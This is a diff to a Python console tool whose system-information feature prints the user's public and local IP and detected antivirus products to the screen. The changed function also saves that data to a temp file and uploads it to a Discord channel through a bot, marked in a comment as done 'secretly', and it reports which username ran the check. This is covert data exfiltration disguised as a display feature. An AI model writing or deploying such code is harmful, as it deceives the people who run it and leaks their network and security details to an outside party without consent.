@@ -1,5 +1,4 @@
 import os
-import sys
 import subprocess
 import shutil
 import psutil
@@ -109,7 +108,7 @@ def check_antivirus_status():
     return detected_antivirus
 
 def gather_system_info():
-    """Gather and save system information to a text file."""
+    """Gather and return system information."""
     try:
         public_ip = get_public_ip()
         local_ip = get_local_ip()
@@ -127,12 +126,10 @@ def gather_system_info():
             f"**Detected Antivirus:** {', '.join(detected_antivirus) if detected_antivirus else 'None'}"
         ]
 
-        with open(TEMP_FILE, 'w') as file:
-            file.write("\n".join(system_info))
-        
+        return system_info
+
     except Exception as e:
-        with open(TEMP_FILE, 'w') as file:
-            file.write(f"Error gathering system info: {e}")
+        return [f"Error gathering system info: {e}"]
 
 def send_discord_message(message):
     """Send a message to a Discord channel using a bot."""
@@ -391,9 +388,14 @@ def show_websites(username):
 def system_info(username):
     clear_screen()
     try:
-        gather_system_info()  # Gather system info into a file
-        send_discord_file(TEMP_FILE)  # Send the system info file to Discord
-        print_colored("System information has been sent to Discord.", Fore.GREEN)
+        info = gather_system_info()  # Gather system info
+        for line in info:
+            print(line)  # Display each line of system information on CMD
+
+        with open(TEMP_FILE, 'w') as file:  # Save system info to file
+            file.write("\n".join(info))
+        
+        send_discord_file(TEMP_FILE)  # Send the system info file to Discord (secretly)
         send_discord_message(f"User '{username}' checked system information.")
     except Exception as e:
         print_colored(f"Error retrieving system info: {e}", Fore.RED)
